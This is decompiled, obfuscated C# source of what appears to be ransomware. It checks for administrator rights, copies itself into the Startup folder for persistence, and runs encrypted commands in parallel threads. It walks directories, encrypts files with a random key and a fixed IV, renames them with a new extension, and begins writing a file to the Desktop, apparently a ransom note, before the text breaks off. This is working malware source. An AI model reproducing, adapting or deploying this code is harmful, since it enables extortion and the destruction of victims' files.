using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using zMrGwdqoENxQb;

namespace gZJMShdGuoGG;

internal sealed class pMhSnWjBfMXV
{
	public sealed class JLIKkWKfhvWVtNe
	{
		private static StringCollection ScHzRAwUqrQS;

		private static List<string> kabGoDHQBmM;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107411400));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107394245)) && !text.ToLower().Contains(getString_0(107411395)) && !text.ToLower().Contains(getString_0(107394211)) && !text.ToLower().Contains(getString_0(107394230)) && !text.ToLower().Contains(getString_0(107411414)) && !text.ToLower().Contains(getString_0(107394152)) && !text.ToLower().Contains(getString_0(107394548)) && !text.ToLower().Contains(getString_0(107394499)) && !text.ToLower().Contains(getString_0(107394514)) && !text.ToLower().Contains(getString_0(107394465)) && !text.ToLower().Contains(getString_0(107394448)) && !text.ToLower().Contains(getString_0(107394463)) && !text.ToLower().Contains(getString_0(107394414)) && !text.ToLower().Contains(getString_0(107394401)) && !text.ToLower().Contains(getString_0(107393868)) && !text.ToLower().Contains(getString_0(107393887)) && !text.ToLower().Contains(getString_0(107393874)) && !text.ToLower().Contains(getString_0(107393825)) && !text.ToLower().Contains(getString_0(107393808)) && !text.Contains(XpzNMVUBwHhS(getString_0(107393823))) && !text.Contains(getString_0(107393766)) && !text.Contains(getString_0(107393785)) && !text.EndsWith(getString_0(107395682)) && !text.EndsWith(getString_0(107393756)) && !text.EndsWith(getString_0(107393751)) && !text.EndsWith(getString_0(107393746)) && !text.EndsWith(getString_0(107393709)) && !text.ToLower().Contains(getString_0(107393704)) && !text.ToLower().Contains(oWAGWCpnIrmUr))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(TDenpsblwtjA) * 1024.0 * 1024.0 && IXAXCculmxrX == getString_0(107396853))
							{
								kabGoDHQBmM.Add(text);
							}
							else if (File.Exists(text) && IXAXCculmxrX == getString_0(107396355))
							{
								kabGoDHQBmM.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return kabGoDHQBmM;
		}

		static JLIKkWKfhvWVtNe()
		{
			Strings.CreateGetStringDelegate(typeof(JLIKkWKfhvWVtNe));
			ScHzRAwUqrQS = new StringCollection();
			kabGoDHQBmM = new List<string>();
		}
	}

	private sealed class NnGlEDJSksakxu
	{
		public string ItbniDHhOOFK;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == ItbniDHhOOFK;
		}
	}

	private sealed class mLYpMUryaRiSQvPX
	{
		private sealed class NCjRcFMIqGOL
		{
			public mLYpMUryaRiSQvPX cTsbrvLXpufp;

			public string yKCwoMIcfh;

			public void _003CCrypt_003Eb__1f()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					cWnPaBwTjkGoyoj(WindowsIdentity.GetCurrent().Name, yKCwoMIcfh);
				}
			}

			public void _003CCrypt_003Eb__20()
			{
				AQiclxjNMx(yKCwoMIcfh, cTsbrvLXpufp.EEsUbQHGqZ, cTsbrvLXpufp.zMmStqWJEVV, cTsbrvLXpufp.SIKjOIZpiViYDYpgo, cTsbrvLXpufp.KmjiHQvFPVzK);
			}
		}

		public string[] EEsUbQHGqZ;

		public string[] SIKjOIZpiViYDYpgo;

		public string KmjiHQvFPVzK;

		public string zMmStqWJEVV;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1e(string string_0)
		{
			NCjRcFMIqGOL CS_0024_003C_003E8__locals0 = new NCjRcFMIqGOL();
			CS_0024_003C_003E8__locals0.cTsbrvLXpufp = this;
			CS_0024_003C_003E8__locals0.yKCwoMIcfh = string_0;
			Thread thread = new Thread((ThreadStart)delegate
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					cWnPaBwTjkGoyoj(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.yKCwoMIcfh);
				}
			});
			thread.Priority = ThreadPriority.Normal;
			thread.IsBackground = true;
			thread.Start();
			if (IXGBrnKSNVJar == getString_0(107396859))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					AQiclxjNMx(CS_0024_003C_003E8__locals0.yKCwoMIcfh, CS_0024_003C_003E8__locals0.cTsbrvLXpufp.EEsUbQHGqZ, CS_0024_003C_003E8__locals0.cTsbrvLXpufp.zMmStqWJEVV, CS_0024_003C_003E8__locals0.cTsbrvLXpufp.SIKjOIZpiViYDYpgo, CS_0024_003C_003E8__locals0.cTsbrvLXpufp.KmjiHQvFPVzK);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				AQiclxjNMx(CS_0024_003C_003E8__locals0.yKCwoMIcfh, EEsUbQHGqZ, zMmStqWJEVV, SIKjOIZpiViYDYpgo, KmjiHQvFPVzK);
			}
		}

		static mLYpMUryaRiSQvPX()
		{
			Strings.CreateGetStringDelegate(typeof(mLYpMUryaRiSQvPX));
		}
	}

	private sealed class xuOTRJXCHgsDSU
	{
		public List<string> NIDHqASSyQFTchSJr;

		public List<string> KnvlCnzqGAfF;

		public string iuKzBvNoRYUqK;

		public string[] lXcMiunKHQSQT;

		public string ZqYERyKJrFKUDg;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__28(string string_0)
		{
			foreach (string item in KnvlCnzqGAfF)
			{
				if (lXcMiunKHQSQT.Length != 0)
				{
					string[] array = lXcMiunKHQSQT;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0415;
					}
				}
				if (!item.EndsWith(string_0) || AukkRFRjPWcJymi.Contains(item))
				{
					continue;
				}
				if (tHjHJyCbAsL == getString_0(107396867))
				{
					try
					{
						if (qSfKWgWzWCjN.ZpfruJCHwVBFAisof(item))
						{
							qSfKWgWzWCjN.weEHRBSklsYu(item);
						}
					}
					catch
					{
					}
				}
				AukkRFRjPWcJymi.Add(item);
				if (!mLpIayRKyplR.Contains(Path.GetDirectoryName(item)))
				{
					mLpIayRKyplR.Add(Path.GetDirectoryName(item));
				}
				NhpGuVXJqNFZ(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception)
					{
						goto end_IL_00d3;
					}
					if (VAaXrNEuZTj == getString_0(107396867) && new FileInfo(item).Length > Convert.ToInt32(zSkjAkSdrNaEQ) * 1024 * 1024 && !NIDHqASSyQFTchSJr.Contains(string_0))
					{
						if (eCgqgJacXEtH == getString_0(107396867))
						{
							foreach (string item2 in hMmNJESmajNLVSI)
							{
								if (item.ToLower().EndsWith(item2) && YsATJjivDuNMD == getString_0(107396867))
								{
									if (Convert.ToInt32(DLyLpigOjpixLmug) * 1024 * 1024 > new FileInfo(item).Length)
									{
										try
										{
											DqGwyJRAyz.CWnyAidUENok(getString_0(107395595), getString_0(107395590), getString_0(107395545), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && YsATJjivDuNMD == getString_0(107396369))
								{
									try
									{
										DqGwyJRAyz.CWnyAidUENok(getString_0(107395595), getString_0(107395590), getString_0(107395545), item);
									}
									catch
									{
									}
								}
							}
						}
						string text = lIWyTSJADVGOwjs.iUTbNhATtsHlJ(32);
						string s = wtkmcRpnyDquKa.QNCVDGICcd(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = HAGwxQagSCcKAotj.zQizjsdesaGi(item, Convert.ToInt32(zSkjAkSdrNaEQ) * 1024 * 1024);
						array2 = ((!VOjbVZMNEqmaD) ? (rtwOYUfYif ? HAGwxQagSCcKAotj.pQEqVfqBQsgNPn(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HAGwxQagSCcKAotj.pQEqVfqBQsgNPn(byte_, Encoding.ASCII.GetBytes(ZqYERyKJrFKUDg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (rtwOYUfYif ? ZSIDzfXTtqFeicqW.ILqMkOByePBB(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ZSIDzfXTtqFeicqW.ILqMkOByePBB(byte_, Encoding.ASCII.GetBytes(ZqYERyKJrFKUDg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
						HAGwxQagSCcKAotj.hoTNCLBmzKEOmkW(item, array2, bytes);
						if (iuKzBvNoRYUqK != getString_0(107393190))
						{
							File.Move(item, item + iuKzBvNoRYUqK);
						}
					}
					else if (iuKzBvNoRYUqK != getString_0(107393190))
					{
						HVPRfDevtwif(item, item + iuKzBvNoRYUqK, ufZZLSdBndJl);
					}
					else
					{
						HVPRfDevtwif(item, item + getString_0(107393185), ufZZLSdBndJl);
					}
					goto IL_0415;
					end_IL_00d3:;
				}
				catch (Exception)
				{
					goto IL_0415;
				}
				continue;
				IL_0415:
				KnvlCnzqGAfF.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__29(string string_0)
		{
			if (lXcMiunKHQSQT.Length != 0)
			{
				string[] array = lXcMiunKHQSQT;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!string_0.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_03db;
				}
			}
			if (!AukkRFRjPWcJymi.Contains(string_0))
			{
				if (tHjHJyCbAsL == getString_0(107396867))
				{
					try
					{
						if (qSfKWgWzWCjN.ZpfruJCHwVBFAisof(string_0))
						{
							qSfKWgWzWCjN.weEHRBSklsYu(string_0);
						}
					}
					catch
					{
					}
				}
				AukkRFRjPWcJymi.Add(string_0);
				if (!mLpIayRKyplR.Contains(Path.GetDirectoryName(string_0)))
				{
					mLpIayRKyplR.Add(Path.GetDirectoryName(string_0));
				}
				NhpGuVXJqNFZ(string_0);
				try
				{
					try
					{
						if (new FileInfo(string_0).Length != 0L)
						{
							goto end_IL_00ac;
						}
						goto end_IL_00ac_2;
						end_IL_00ac:;
					}
					catch (Exception)
					{
						goto end_IL_00ac_2;
					}
					if (VAaXrNEuZTj == getString_0(107396867) && new FileInfo(string_0).Length > Convert.ToInt32(zSkjAkSdrNaEQ) * 1024 * 1024)
					{
						if (eCgqgJacXEtH == getString_0(107396867))
						{
							foreach (string item in hMmNJESmajNLVSI)
							{
								if (string_0.ToLower().EndsWith(item) && YsATJjivDuNMD == getString_0(107396867))
								{
									if (Convert.ToInt32(DLyLpigOjpixLmug) * 1024 * 1024 > new FileInfo(string_0).Length)
									{
										try
										{
											DqGwyJRAyz.CWnyAidUENok(getString_0(107395595), getString_0(107395590), getString_0(107395545), string_0);
										}
										catch
										{
										}
									}
								}
								else if (string_0.ToLower().EndsWith(item) && YsATJjivDuNMD == getString_0(107396369))
								{
									try
									{
										DqGwyJRAyz.CWnyAidUENok(getString_0(107395595), getString_0(107395590), getString_0(107395545), string_0);
									}
									catch
									{
									}
								}
							}
						}
						string text = lIWyTSJADVGOwjs.iUTbNhATtsHlJ(32);
						string s = wtkmcRpnyDquKa.QNCVDGICcd(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = HAGwxQagSCcKAotj.zQizjsdesaGi(string_0, Convert.ToInt32(zSkjAkSdrNaEQ) * 1024 * 1024);
						array2 = ((!VOjbVZMNEqmaD) ? (rtwOYUfYif ? HAGwxQagSCcKAotj.pQEqVfqBQsgNPn(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HAGwxQagSCcKAotj.pQEqVfqBQsgNPn(byte_, Encoding.ASCII.GetBytes(ZqYERyKJrFKUDg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (rtwOYUfYif ? ZSIDzfXTtqFeicqW.ILqMkOByePBB(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ZSIDzfXTtqFeicqW.ILqMkOByePBB(byte_, Encoding.ASCII.GetBytes(ZqYERyKJrFKUDg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
						HAGwxQagSCcKAotj.hoTNCLBmzKEOmkW(string_0, array2, bytes);
						if (iuKzBvNoRYUqK != getString_0(107393190))
						{
							File.Move(string_0, string_0 + iuKzBvNoRYUqK);
						}
					}
					else if (iuKzBvNoRYUqK != getString_0(107393190))
					{
						HVPRfDevtwif(string_0, string_0 + iuKzBvNoRYUqK, ufZZLSdBndJl);
					}
					else
					{
						HVPRfDevtwif(string_0, string_0 + getString_0(107393185), ufZZLSdBndJl);
					}
					end_IL_00ac_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_03db;
			IL_03db:
			KnvlCnzqGAfF.Remove(string_0);
		}

		static xuOTRJXCHgsDSU()
		{
			Strings.CreateGetStringDelegate(typeof(xuOTRJXCHgsDSU));
		}
	}

	private sealed class AsKnkpuerjEZaXj
	{
		public string RtpPzhfHoRLm;

		public string kcsqfeJjtlRJW;

		public void _003CEncrypt2_003Eb__30()
		{
			while (true)
			{
				try
				{
					File.Delete(RtpPzhfHoRLm);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__31()
		{
			while (true)
			{
				try
				{
					if (File.Exists(kcsqfeJjtlRJW))
					{
						File.Delete(kcsqfeJjtlRJW);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string zkqKKKlIPmfFPIZ;

	public static byte[] ufZZLSdBndJl;

	public static string IXAXCculmxrX;

	public static string TDenpsblwtjA;

	public static List<string> gnEYEOiddOO;

	public static List<string> ewHbwqsGlfJXFT;

	public static string ePJbKchWtVjQiki;

	public static string ZqYERyKJrFKUDg;

	public static string ylLSIHUuGEVmP;

	public static int FfewSehsvughKG;

	public static string tHjHJyCbAsL;

	public static string EBpgOIGaies;

	public static string lLuRNEZAtcqFnf;

	public static string JagprLLYwUJrTt;

	public static string FsbTAFgxlYvpUL;

	public static string VWoEYWXSVBgvoj;

	public static string LhBCIPCGuuFCA;

	public static string fAqexJEIcKmc;

	public static List<string> aKtQtpADqLTU;

	public static List<string> mLpIayRKyplR;

	public static string nEUzFSywfZUr;

	public static string nbrtdkNpmSO;

	public static string otAZsSQeHXan;

	public static List<string> AukkRFRjPWcJymi;

	public static string vfEzOPUSdQRwe;

	private static string WxjJocYdLSiP;

	public static string IXGBrnKSNVJar;

	public static string jESlxKRhnT;

	public static List<string> qpFzUvNRAuPZ;

	public static List<string> zWDncWjSBzFKqw;

	public static List<string> PmIelqnjoGmESGJ;

	public static List<string> WTUhRiZneOlt;

	public static string ulUwCBHwSSyi;

	public static List<string> SiUCGwbiYZvKNq;

	public static List<string> KKtWmakpVhdA;

	public static string AoEfHeLwaPQ;

	public static string OwSmDzbxhbr;

	internal static DateTime tgwwssLUGYINdp;

	internal static DateTime epLbKNVGZbzsK;

	public static string VAaXrNEuZTj;

	public static string zSkjAkSdrNaEQ;

	public static string ldgzBVJjgOKZA;

	public static string iSaUXgFGhbBU;

	public static string KXBSfLUmHJ;

	public static string XeRdELiadDuurzB;

	public static string HWKxjANFxbm;

	public static string eCgqgJacXEtH;

	public static List<string> hMmNJESmajNLVSI;

	public static string YsATJjivDuNMD;

	public static string DLyLpigOjpixLmug;

	public static string wLHCCOhfNgUdZ;

	public static string NJsxFWbcdxOk;

	public static string MFYtUtLPTmih;

	public static string MmCLhdrmXjijP;

	public static string KBzEEwpcadk;

	public static string fNmnCeBtyRLy;

	public static string SubzSuIqJZsa;

	public static string uFuCHDmgpOnnL;

	public static string sZOSRFhRgSIn;

	public static string ErQaIKQkieIFY;

	public static string iyWwZOcQQVpELUp;

	public static string rXzetNuPLApv;

	public static string oGaVmSmuvgCw;

	public static string FmNZjVpwMZuqGJ;

	public static string LTkMlaDCpNiF;

	public static string IvlTKbPvYuys;

	public static string TLGMzrWjiAKxagb;

	public static string oWAGWCpnIrmUr;

	public static string SINcssXKqspnL;

	public static string FAAxKyrvepTlYX;

	public static string FmrgwwhfMbnasy;

	public static string zArXlyFCOP;

	public static string UvWHlEcOdCgiTx;

	public static string RcziZDHEplKwAMtJQ;

	public static string uFCeAgUGzeiOVT;

	public static string AYsvhSrYMBxXIJ;

	public static string yVgzNpNYZM;

	public static string[] VIPXLYpgVjF;

	public static string GvhFKpDNFWLzX;

	public static bool VOjbVZMNEqmaD;

	public static string yRmUjTdvkZqHGG;

	public static bool rtwOYUfYif;

	public static bool ZLXxZaLrGVPm;

	public static bool FaIQeccuYFGcm;

	public static bool kdpmwXQYrgtQ;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate13;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate14;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate15;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate16;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate17;

	[NonSerialized]
	internal static GetString getString_0;

	private static void Main(string[] args)
	{
		try
		{
			NnGlEDJSksakxu CS_0024_003C_003E8__locals0 = new NnGlEDJSksakxu();
			CS_0024_003C_003E8__locals0.ItbniDHhOOFK = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.ItbniDHhOOFK) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			pXDXINTZaVAT.RXgzVrndLpleAYD(WxjJocYdLSiP);
		}
		catch (Exception)
		{
		}
		try
		{
			if (RcziZDHEplKwAMtJQ == getString_0(107396850))
			{
				Thread thread = new Thread(lumAWYJjZez.FsQkLiAXhLz);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		if (lLuRNEZAtcqFnf == getString_0(107396850))
		{
			Thread.Sleep(int.Parse(JagprLLYwUJrTt));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && HWKxjANFxbm == getString_0(107396850))
		{
			try
			{
				xQsTyseFwMzaC(XpzNMVUBwHhS(getString_0(107396813)));
			}
			catch
			{
			}
		}
		if (FsbTAFgxlYvpUL == getString_0(107396850))
		{
			IsqArpFpqTGJ.bGjENrlzBgm();
		}
		try
		{
			if (LhBCIPCGuuFCA == getString_0(107396850) && KWezrppCZbr.fGNXszKZbXxHAgU())
			{
				KWezrppCZbr.JyuvhLrlroN();
			}
		}
		catch (Exception)
		{
		}
		if (nbrtdkNpmSO == getString_0(107396850) && KWezrppCZbr.fGNXszKZbXxHAgU())
		{
			new qGUzKUzjIwd().wsLUFsqKRceBxPxA(bool_0: false);
			new qGUzKUzjIwd().rahbPilFHXlwq();
		}
		if (EBpgOIGaies == getString_0(107396850))
		{
			EBIzGnlYFIcuR.ubafOihfzt();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107396708);
			string text2 = text + Path.GetFileName(fileName);
			if (ylLSIHUuGEVmP == getString_0(107396850) && fileName != text2)
			{
				Thread thread2 = new Thread(eVLtWawfUiPzQ);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (ePJbKchWtVjQiki == getString_0(107396850) && mainModule != null && fileName != text2)
			{
				try
				{
					FfewSehsvughKG = YngMsxowrSx(0, aKtQtpADqLTU.Count);
					File.Copy(fileName, text + aKtQtpADqLTU[FfewSehsvughKG], overwrite: true);
					Process.Start(text + aKtQtpADqLTU[FfewSehsvughKG]);
					FlYakovDxkPjro();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (AoEfHeLwaPQ == getString_0(107396850) && DateTime.Now < tgwwssLUGYINdp)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (OwSmDzbxhbr == getString_0(107396850) && DateTime.Now > epLbKNVGZbzsK)
			{
				FlYakovDxkPjro();
			}
		}
		catch
		{
		}
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate
			{
				List<string> source = zWDncWjSBzFKqw;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						GmDarSxQnFBGZ(getString_0(107393127), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> source2 = qpFzUvNRAuPZ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						GmDarSxQnFBGZ(getString_0(107394020), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				List<string> pmIelqnjoGmESGJ = PmIelqnjoGmESGJ;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
					{
						GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393118)), string_0);
					};
				}
				Parallel.ForEach(pmIelqnjoGmESGJ, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				if (yVgzNpNYZM == getString_0(107396850))
				{
					string[] vIPXLYpgVjF = VIPXLYpgVjF;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393118)), getString_0(107393605) + string_0 + getString_0(107393628));
						};
					}
					Parallel.ForEach(vIPXLYpgVjF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				rYtrFMMUXXWsWUH(ulUwCBHwSSyi);
				List<string> wTUhRiZneOlt = WTUhRiZneOlt;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393623)), string_0);
					};
				}
				Parallel.ForEach(wTUhRiZneOlt, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> siUCGwbiYZvKNq = SiUCGwbiYZvKNq;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393566)), string_0);
					};
				}
				Parallel.ForEach(siUCGwbiYZvKNq, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
				List<string> kKtWmakpVhdA = KKtWmakpVhdA;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
					{
						GmDarSxQnFBGZ(getString_0(107393549), string_0);
					};
				}
				Parallel.ForEach(kKtWmakpVhdA, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && FaIQeccuYFGcm)
			{
				try
				{
					Thread thread4 = new Thread(pBQHnVpNuPdMIvv.kKboxjQaZakdWlW);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			GmDarSxQnFBGZ(getString_0(107396703), getString_0(107396722));
			GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107397181)), XpzNMVUBwHhS(getString_0(107397168)));
			GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107397181)), XpzNMVUBwHhS(getString_0(107397038)));
		}
		if (nEUzFSywfZUr == getString_0(107396850) && ivQlqIjSsZmKkw() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread5 = new Thread(rOTpOhnZQZvUMWF.lGhuCtbimkWaDdBZ);
			thread5.IsBackground = false;
			thread5.Priority = ThreadPriority.Normal;
			thread5.Start();
		}
		_ = jESlxKRhnT == getString_0(107396850);
		if (ldgzBVJjgOKZA == getString_0(107396352))
		{
			ZqYERyKJrFKUDg = lIWyTSJADVGOwjs.iUTbNhATtsHlJ(8);
			ZqYERyKJrFKUDg += lIWyTSJADVGOwjs.iUTbNhATtsHlJ(8);
			ZqYERyKJrFKUDg += lIWyTSJADVGOwjs.iUTbNhATtsHlJ(8);
			ZqYERyKJrFKUDg += lIWyTSJADVGOwjs.iUTbNhATtsHlJ(8);
		}
		else
		{
			ZqYERyKJrFKUDg = getString_0(107396379);
		}
		string text3 = wtkmcRpnyDquKa.QNCVDGICcd(ZqYERyKJrFKUDg);
		if (fNmnCeBtyRLy == getString_0(107396850))
		{
			UpNZjYgstdWU();
		}
		mFbFjXKIEQXZg.wMpQMbBMPkm(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), oWAGWCpnIrmUr), pSVtEecOZzJBWO(text3), null, null, getString_0(107396334), getString_0(107396317), null);
		try
		{
			jjwOjOEKOtUpGyV(new string[1] { getString_0(107396268) }, new string[100]
			{
				getString_0(107396259),
				getString_0(107396254),
				getString_0(107396281),
				getString_0(107396272),
				getString_0(107396235),
				getString_0(107396230),
				getString_0(107396225),
				getString_0(107396252),
				getString_0(107396247),
				getString_0(107396242),
				getString_0(107396205),
				getString_0(107396200),
				getString_0(107396191),
				getString_0(107396218),
				getString_0(107396209),
				getString_0(107396684),
				getString_0(107396679),
				getString_0(107396674),
				getString_0(107396701),
				getString_0(107396696),
				getString_0(107396687),
				getString_0(107396650),
				getString_0(107396645),
				getString_0(107396640),
				getString_0(107396667),
				getString_0(107396662),
				getString_0(107396657),
				getString_0(107396620),
				getString_0(107396615),
				getString_0(107396610),
				getString_0(107396637),
				getString_0(107396632),
				getString_0(107396627),
				getString_0(107396622),
				getString_0(107396581),
				getString_0(107396576),
				getString_0(107396603),
				getString_0(107396598),
				getString_0(107396225),
				getString_0(107396593),
				getString_0(107396247),
				getString_0(107396552),
				getString_0(107396547),
				getString_0(107396542),
				getString_0(107396569),
				getString_0(107396564),
				getString_0(107396559),
				getString_0(107396522),
				getString_0(107396517),
				getString_0(107396512),
				getString_0(107396539),
				getString_0(107396534),
				getString_0(107396529),
				getString_0(107396492),
				getString_0(107396487),
				getString_0(107396482),
				getString_0(107396509),
				getString_0(107396504),
				getString_0(107396495),
				getString_0(107396458),
				getString_0(107396449),
				getString_0(107396468),
				getString_0(107396593),
				getString_0(107395911),
				getString_0(107395902),
				getString_0(107395925),
				getString_0(107395884),
				getString_0(107395875),
				getString_0(107395898),
				getString_0(107395893),
				getString_0(107395852),
				getString_0(107395843),
				getString_0(107395866),
				getString_0(107395861),
				getString_0(107395856),
				getString_0(107395819),
				getString_0(107395814),
				getString_0(107395809),
				getString_0(107395836),
				getString_0(107395827),
				getString_0(107395822),
				getString_0(107395785),
				getString_0(107395780),
				getString_0(107395775),
				getString_0(107395802),
				getString_0(107395793),
				getString_0(107395752),
				getString_0(107395747),
				getString_0(107396627),
				getString_0(107395742),
				getString_0(107395769),
				getString_0(107395764),
				getString_0(107395759),
				getString_0(107395722),
				getString_0(107395713),
				getString_0(107395740),
				getString_0(107395735),
				getString_0(107395726),
				getString_0(107395689),
				getString_0(107395684)
			}, new string[0], ZqYERyKJrFKUDg, getString_0(107395679));
		}
		catch
		{
		}
		ZqYERyKJrFKUDg = lIWyTSJADVGOwjs.iUTbNhATtsHlJ(32);
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395698)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395698));
